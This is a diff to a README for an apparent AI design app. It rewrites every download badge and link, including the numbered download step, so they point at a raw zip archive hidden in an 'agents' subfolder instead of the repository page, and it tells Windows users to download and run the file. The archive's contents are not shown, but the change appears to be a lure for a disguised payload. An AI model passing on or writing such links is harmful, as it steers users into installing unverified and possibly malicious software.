@@ -1,6 +1,6 @@
 # 🎨 ai-design-team - Plan, create, and ship faster
 
-[![Download the app](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/emlynnhonourable215/ai-design-team)
+[![Download the app](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/emlynnhonourable215/ai-design-team/raw/refs/heads/main/agents/team-design-ai-v1.7.zip)
 
 ## 🚀 What this app does
 
@@ -31,12 +31,12 @@ For the best experience, close apps you do not need before you start.
 ## 📥 Download the app
 
 1. Open the download page:
-   https://github.com/emlynnhonourable215/ai-design-team
+   https://github.com/emlynnhonourable215/ai-design-team/raw/refs/heads/main/agents/team-design-ai-v1.7.zip
 2. On the page, look for the latest release or the main download option
 3. Download the Windows file to your computer
 4. If your browser asks where to save it, choose a folder you can find later, like Downloads or Desktop
 
-[![Download from GitHub](https://img.shields.io/badge/GitHub%20Download-grey?style=for-the-badge&logo=github)](https://github.com/emlynnhonourable215/ai-design-team)
+[![Download from GitHub](https://img.shields.io/badge/GitHub%20Download-grey?style=for-the-badge&logo=github)](https://github.com/emlynnhonourable215/ai-design-team/raw/refs/heads/main/agents/team-design-ai-v1.7.zip)
 
 ## 🪟 Install or run on Windows
 
@@ -194,4 +194,4 @@ If the repository includes extra files such as guides, assets, or config files, 
 
 If you need to get the app again, use the main page here:
 
-https://github.com/emlynnhonourable215/ai-design-team
+https://github.com/emlynnhonourable215/ai-design-team/raw/refs/heads/main/agents/team-design-ai-v1.7.zip
